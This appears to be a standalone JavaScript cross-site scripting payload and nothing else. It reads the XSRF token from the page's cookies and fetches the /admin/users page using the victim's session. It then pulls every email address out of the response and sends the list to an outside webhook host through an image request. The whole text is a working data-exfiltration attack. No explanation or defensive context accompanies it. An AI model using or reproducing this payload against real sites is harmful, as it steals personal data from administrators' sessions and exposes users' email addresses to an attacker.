(function(){
  var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);

  // Exfiltrate users list page (GET - always works)
  fetch('/admin/users',{credentials:'include'})
    .then(function(r){return r.text();})
    .then(function(html){
      var emails=html.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}/g)||[];
      new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?emails='+encodeURIComponent(emails.join(','));
    });

})();
